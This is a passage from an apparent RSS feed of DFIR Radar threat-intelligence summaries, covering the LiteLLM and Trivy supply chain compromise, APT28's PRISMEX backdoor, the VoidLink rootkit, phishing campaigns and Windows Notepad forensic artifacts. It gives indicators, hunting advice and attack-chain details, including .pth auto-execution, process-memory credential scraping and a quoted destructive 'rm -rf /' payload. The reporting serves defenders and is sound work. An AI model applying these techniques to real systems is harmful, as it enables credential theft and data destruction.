+• Contains full file paths, SHA256 hashes, last write times, and complete file content (even 500MB+ files)
+• UnsavedChunk structures track every keystroke with cursor positions and CRC32 checksums
+• Recent Notepad v11.2508.38.0 removes file content/hashes from saved files but retains formatting metadata
+
+DFIR opportunities:
+• Recovers content from deleted files if Notepad was used to view them
+• Detailed editing timeline through UnsavedChunk sequences showing character-by-character changes
+• File access evidence via full paths and timestamps even for temporarily viewed files
+• Text encoding detection (ANSI, UTF-8, UTF-16) and carriage return analysis
+
+Hunt for TabState artifacts using glob pattern: C:\Users\*\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\????????-????-????-????-????????????.bin
+
+#DFIR_Radar</description>
+      <category>FORENSICS</category>
+      <source url="https://x.com/DFIR_Radar/status/2037087415777538529">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 08:41:02 +0000</pubDate>
+      <guid isPermaLink="false">2037087415777538529</guid>
+    </item>
+    <item>
+      <title>Coruna: the framework used in Operation Triangulation</title>
+      <link>https://securelist.com/coruna-framework-updated-operation-triangulation-exploit/119228/</link>
+      <description>Kaspersky analyzed Coruna exploit kit and confirmed it's an updated version of the Operation Triangulation framework, now used in watering-hole attacks in Ukraine 🇺🇦 and financial attacks in China 🇨🇳.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037077759915126819">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 08:02:40 +0000</pubDate>
+      <guid isPermaLink="false">2037077759915126819</guid>
+    </item>
+    <item>
+      <title>New Whitepaper: Exploiting Cellular-based IoT Devices</title>
+      <link>https://www.rapid7.com/blog/post/tr-new-whitepaper-exploiting-cellular-based-iot-devices</link>
+      <description>New Rapid7 research shows attackers with physical access can exploit cellular IoT modules to pivot into cloud environments and hide C2 channels in legitimate device traffic.
+
+#DFIR_Radar</description>
+      <category>ICS/OT SECURITY</category>
+      <source url="https://x.com/DFIR_Radar/status/2037062536118362385">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 07:02:10 +0000</pubDate>
+      <guid isPermaLink="false">2037062536118362385</guid>
+    </item>
+    <item>
+      <title>When Your Scanner Becomes the Weapon: From Trivy to LiteLLM</title>
+      <link>https://securityboulevard.com/2026/03/when-your-scanner-becomes-the-weapon-from-trivy-to-litellm/</link>
+      <description>Multi-stage supply chain attack compromised LiteLLM AI proxy via poisoned Trivy scanner, affecting 36% of cloud environments. Attackers harvested cloud credentials and cryptocurrency wallets from infected PyPI packages.
+
+Key technical details:
+• Malicious versions 1.82.7 and 1.82.8 published to PyPI on March 24, 2026 for ~5.5 hours
+• Version 1.82.8 used litellm_init.pth file in site-packages for persistence across all Python processes
+• Payload harvested AWS IMDS credentials, SSH keys, K8s secrets, crypto wallets via /proc/&lt;pid&gt;/mem scraping
+• Exfiltration to models.litellm[.]cloud via AES-256 encryption, C2 at checkmarx[.]zone
+
+Attack chain methodology:
+• Initial compromise: Poisoned Trivy v0.69.4 binary scraped GitHub Actions runner memory
+• Credential theft: Extracted PYPI_PUBLISH_PASSWORD token bypassing GitHub secret masking
+• Package weaponization: Used stolen token to upload malicious versions directly to PyPI
+• Lateral movement: Deployed privileged Kubernetes pods named node-setup-* across clusters
+
+DFIR artifacts and IOCs:
+• Persistence file: ~/.config/sysmon/sysmon.py and systemd service
+• Network indicators: Outbound connections to models.litellm[.]cloud and checkmarx[.]zone
+• K8s indicators: Search for node-setup-* pods in kube-system namespace
+• File system: litellm_init.pth in Python site-packages directories
+
+Hunt for litellm_init.pth files in site-packages directories and monitor for systemd services polling external domains every ~50 minutes.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037047543738081390">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 06:02:36 +0000</pubDate>
+      <guid isPermaLink="false">2037047543738081390</guid>
+    </item>
+    <item>
+      <title>LiteLLM Supply Chain Compromise</title>
+      <link>https://www.netspi.com/blog/executive-blog/ai-ml-pentesting/litellm-supply-chain-compromise/</link>
+      <description>LiteLLM supply chain compromise targeting AI infrastructure exposes critical weakness in LLM proxy frameworks. Malicious PyPI packages v1.82.7 and v1.82.8 exfiltrated credentials from 95M+ installations through sophisticated .pth file execution.
+
+Key technical details:
+• Attack vector: Compromised maintainer GitHub account → CI/CD pipeline injection → malicious PyPI wheel distribution
+• Execution: litellm_init.pth file (34,628 bytes) auto-executes on Python startup, bypassing import monitoring
+• Payload: Double base64-encoded reconnaissance harvesting env vars, SSH keys, AWS/GCP/Azure creds, K8s secrets, CI/CD tokens
+• Exfiltration: AES-256-CBC encrypted data with RSA-4096 OAEP to https://models.litellm.cloud/ (typosquatting litellm.ai)
+• Scope: Complete credential exposure across entire LLM provider surface area due to proxy architecture
+
+DFIR artifacts:
+• Search site-packages/ directories for litellm_init.pth
+• Monitor outbound connections to models.litellm.cloud
+• Check pip logs for litellm==1.82.7 or 1.82.8 installations
+• Review proxy_server.py modifications in v1.82.7
+
+Impact: AI/ML infrastructure compromise affects credential aggregation points handling API keys for OpenAI, Anthropic, Azure, AWS Bedrock simultaneously.
+
+Hunt for unauthorized .pth files in Python environments and audit LLM provider access logs for credential misuse patterns.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037038834051916261">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 05:27:59 +0000</pubDate>
+      <guid isPermaLink="false">2037038834051916261</guid>
+    </item>
+    <item>
+      <title>Malicious LiteLLM versions linked to TeamPCP supply chain attack</title>
+      <link>https://securityaffairs.com/189948/hacking/malicious-litellm-versions-linked-to-teampcp-supply-chain-attack.html</link>
+      <description>TeamPCP compromised LiteLLM v1.82.7-1.82.8 on PyPI with credential harvester targeting SSH keys, cloud tokens, and Kubernetes secrets. Attack likely originated from Trivy CI/CD breach, part of multi-ecosystem campaign.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037032786163347509">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 05:03:57 +0000</pubDate>
+      <guid isPermaLink="false">2037032786163347509</guid>
+    </item>
+    <item>
+      <title>Pawn Storm Campaign Deploys PRISMEX, Targets Government and Critical Infrastructure Entities</title>
+      <link>https://www.trendmicro.com/en_us/research/26/c/pawn-storm-targets-govt-infra.html</link>
+      <description>Russian 🇷🇺 Pawn Storm (APT28) deploys PRISMEX backdoor against Ukrainian 🇺🇦 defense supply chain using steganography and cloud services for C2. Campaign targets government and critical infrastructure with email-based persistence mechanisms.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2037017149252710488">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 04:01:49 +0000</pubDate>
+      <guid isPermaLink="false">2037017149252710488</guid>
+    </item>
+    <item>
+      <title>Enhanced message groups: Improving efficiency in email incident response · Blog · Sublime Security</title>
+      <link>https://proxied2.sublime.security/blog/enhanced-message-groups-improving-efficiency-in-email-incident-response</link>
+      <description>Sublime Security enhanced their email grouping algorithm to cluster similar phishing campaigns even with varied subjects, senders, and content.
+
+#DFIR_Radar</description>
+      <category>DETECTION</category>
+      <source url="https://x.com/DFIR_Radar/status/2037002024995197223">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 03:01:43 +0000</pubDate>
+      <guid isPermaLink="false">2037002024995197223</guid>
+    </item>
+    <item>
+      <title>PolyShell attacks target 56% of all vulnerable Magento stores</title>
+      <link>https://www.bleepingcomputer.com/news/security/polyshell-attacks-target-56-percent-of-all-vulnerable-magento-stores/</link>
+      <description>Mass exploitation of PolyShell in Magento 2.x/Adobe Commerce hits 56% of vulnerable stores since March 19th. Attackers deploy novel WebRTC skimmers that bypass CSP controls via encrypted UDP channels.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2036986970728260080">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 02:01:54 +0000</pubDate>
+      <guid isPermaLink="false">2036986970728260080</guid>
+    </item>
+    <item>
+      <title>Bubble AI app builder abused to steal Microsoft account credentials</title>
+      <link>https://www.bleepingcomputer.com/news/security/bubble-ai-app-builder-abused-to-steal-microsoft-account-credentials/</link>
+      <description>Threat actors bypass email security by abusing Bubble.io's legitimate domain to host phishing redirects targeting Microsoft credentials. AI-generated apps create complex JavaScript that evades automated analysis.
+
+#DFIR_Radar</description>
+      <category>DETECTION</category>
+      <source url="https://x.com/DFIR_Radar/status/2036971878875562289">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 01:01:56 +0000</pubDate>
+      <guid isPermaLink="false">2036971878875562289</guid>
+    </item>
+    <item>
+      <title>Cisco Products: CVSS (Max): 8.6</title>
+      <link>http://portal.auscert.org.au/bulletins/ESB-2026.2955/</link>
+      <description>Critical IKEv2 DoS flaw (CVE-2026-20012, CVSS 8.6) affects Cisco IOS/XE, ASA, and FTD devices. Unauthenticated attackers can crash routers or exhaust firewall memory with crafted packets—no workarounds available.
+
+#DFIR_Radar</description>
+      <category>VULNERABILITY</category>
+      <source url="https://x.com/DFIR_Radar/status/2036957184722882651">DFIR Radar</source>
+      <pubDate>Thu, 26 Mar 2026 00:03:32 +0000</pubDate>
+      <guid isPermaLink="false">2036957184722882651</guid>
+    </item>
+    <item>
+      <title>Device Code Phishing Hits 340+ Microsoft 365 Orgs Across Five Countries via OAuth Abuse</title>
+      <link>https://thehackernews.com/2026/03/device-code-phishing-hits-340-microsoft.html</link>
+      <description>Device code phishing campaign abuses OAuth to compromise Microsoft 365 identities across 340+ organizations in US 🇺🇸, Canada 🇨🇦, Australia 🇦🇺, New Zealand 🇳🇿, and Germany 🇩🇪.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2036941651868832159">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 23:01:49 +0000</pubDate>
+      <guid isPermaLink="false">2036941651868832159</guid>
+    </item>
+    <item>
+      <title>InfoSec News Nuggets 03/25/2026</title>
+      <link>https://aboutdfir.com/infosec-news-nuggets-03-25-2026/</link>
+      <description>TeamPCP supply chain attack escalated from Trivy compromise to backdoor litellm versions 1.82.7-1.82.8, affecting 36% of cloud environments.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2036926580078125413">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 22:01:56 +0000</pubDate>
+      <guid isPermaLink="false">2036926580078125413</guid>
+    </item>
+    <item>
+      <title>How we built high speed threat hunting for email security · Blog · Sublime Security</title>
+      <link>https://proxied2.sublime.security/blog/how-we-built-high-speed-threat-hunting-for-email-security</link>
+      <description>Sublime Security details their high-speed threat hunting architecture using Message Query Language (MQL) with candidate selection and evaluation phases, processing millions of emails through optimized warm/cold storage splits and parallel proce...
+
+#DFIR_Radar</description>
+      <category>DETECTION</category>
+      <source url="https://x.com/DFIR_Radar/status/2036911472916259099">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 21:01:54 +0000</pubDate>
+      <guid isPermaLink="false">2036911472916259099</guid>
+    </item>
+    <item>
+      <title>New Torg Grabber infostealer malware targets 728 crypto wallets</title>
+      <link>https://www.bleepingcomputer.com/news/security/new-torg-grabber-infostealer-malware-targets-728-crypto-wallets/</link>
+      <description>New Torg Grabber infostealer targets 728 crypto wallets and 850 browser extensions using ClickFix technique. Features ABE bypass for Chrome cookie protection and reflective DLL injection with 334 samples compiled in just 3 months.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2036896374260674716">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 20:01:54 +0000</pubDate>
+      <guid isPermaLink="false">2036896374260674716</guid>
+    </item>
+    <item>
+      <title>Illuminating VoidLink: Technical analysis of the VoidLink rootkit framework</title>
+      <link>https://www.elastic.co/security-labs/illuminating-voidlink</link>
+      <description>Chinese 🇨🇳 threat actor's VoidLink rootkit exposed through leaked source code. Hybrid LKM-eBPF design evolved through 4 generations, showing sophisticated AI-assisted development that hides processes, network connections, and files across CentOS 7 to Ubuntu 22.04.
+
+Technical details:
+• LKM component uses ftrace hooks on __x64_sys_getdents64, vfs_read for process/file hiding; masquerades as "amd_mem_encrypt" AMD driver
+• eBPF companion exploits bpf_probe_write_user() to manipulate Netlink buffers, hiding connections from ss utility by "swallowing" SOCK_DIAG_BY_FAMILY messages
+• ICMP C2 channel uses magic value 0xC0DE, XOR key 0x42, supports 10 commands including privilege escalation (GIVE_ROOT) and self-destruct
+• Advanced evasion: 3-second delayed hook installation, anti-debugging timer scanning for strace/gdb/bpftool, kill protection for designated PIDs
+
+Infrastructure artifacts link to Alibaba Cloud 🇨🇳 IPs 8.149.128[.]10 and 116.62.172[.]147. Source code annotations in Simplified Chinese show phase-numbered development matching LLM conversation patterns.
+
+Hunt for unsigned modules with AMD descriptions on non-AMD systems, ftrace hooks on syscall functions, and eBPF programs using bpf_probe_write_user helper.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2036881330353442886">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 19:02:08 +0000</pubDate>
+      <guid isPermaLink="false">2036881330353442886</guid>
+    </item>
+    <item>
+      <title>GlassWorm Malware Uses Solana Dead Drops to Deliver RAT and Steal Browser, Crypto Data</title>
+      <link>https://thehackernews.com/2026/03/glassworm-malware-uses-solana-dead.html</link>
+      <description>GlassWorm campaign now uses Solana blockchain dead drops to deliver multi-stage RAT framework with Chrome extension masquerading as offline Google Docs. Steals browser data, crypto wallets, and captures keystrokes.
+
+#DFIR_Radar</description>
+      <category>MALWARE ANALYSIS</category>
+      <source url="https://x.com/DFIR_Radar/status/2036866277134725540">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 18:02:18 +0000</pubDate>
+      <guid isPermaLink="false">2036866277134725540</guid>
+    </item>
+    <item>
+      <title>TeamPCP’s Checkmarx GitHub Actions Attack: What You Need to Know</title>
+      <link>https://socradar.io/blog/teampcp-checkmarx-github-actions-attack/</link>
+      <description>TeamPCP's sophisticated supply chain attack cascaded from Trivy to Checkmarx, weaponizing GitHub Actions and CI/CD credentials to spread across multiple vendors. The campaign demonstrates how stolen CI tokens enable lateral movement between trusted ecosystems.
+
+Key technical details:
+- CVE-2026-33634: Malicious v0.69.4 Trivy tag pushed using spoofed commits and backdated timestamps
+- Compromised Actions: checkmarx/ast-github-action, checkmarx/kics-github-action harvest runner secrets to tpcp.tar.gz
+- C2 Infrastructure: checkmarx[.]zone, scan.aquasecurtiy[.]org (45.148.10.212), Cloudflare tunnels
+- Fallback exfiltration creates docs-tpcp repos using victim's GITHUB_TOKEN
+- Malicious OpenVSX extensions: ast-results v2.53.0, cx-dev-assist v1.7.0 via compromised ast-phoenix account
+
+Attack methodology:
+- Initial access via February 27 "Pwn Request" exposed Trivy service account token
+- March 19-24 escalation: poisoned GitHub releases → stolen CI credentials → cross-vendor pivot
+- CanisterWorm auto-propagated across 28+ npm packages using stolen publish tokens
+- Iran 🇮🇷-targeted destructive payload: rm -rf / on systems matching Asia/Tehran timezone
+
+DFIR artifacts:
+- Hunt systemd services: pgmon.service, pgmonitor.service, internal-monitor.service
+- K8s DaemonSets: host-provisioner-std, host-provisioner-iran in kube-system namespace
+- Process memory scraping via /proc/[pid]/mem targeting Runner.Worker processes
+- Steganography in v3.
+
+#DFIR_Radar</description>
+      <category>INCIDENT RESPONSE</category>
+      <source url="https://x.com/DFIR_Radar/status/2036851127723905408">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 17:02:06 +0000</pubDate>
+      <guid isPermaLink="false">2036851127723905408</guid>
+    </item>
+    <item>
+      <title>Credential‑Stealing Malware in LiteLLM Supply Chain Attack</title>
+      <link>https://orca.security/resources/blog/litellm-supply-chain-attack-malware/</link>
+      <description>TeamPCP threat group compromised LiteLLM Python package versions 1.82.7 and 1.82.8 on PyPI, deploying credential-stealing malware via supply chain attack. Check your Python environments for these malicious versions immediately.
+
+#DFIR_Radar</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2036805777717973204">DFIR Radar</source>
+      <pubDate>Wed, 25 Mar 2026 14:01:54 +0000</pubDate>
+      <guid isPermaLink="false">2036805777717973204</guid>
+    </item>
+  </channel>
+</rss>
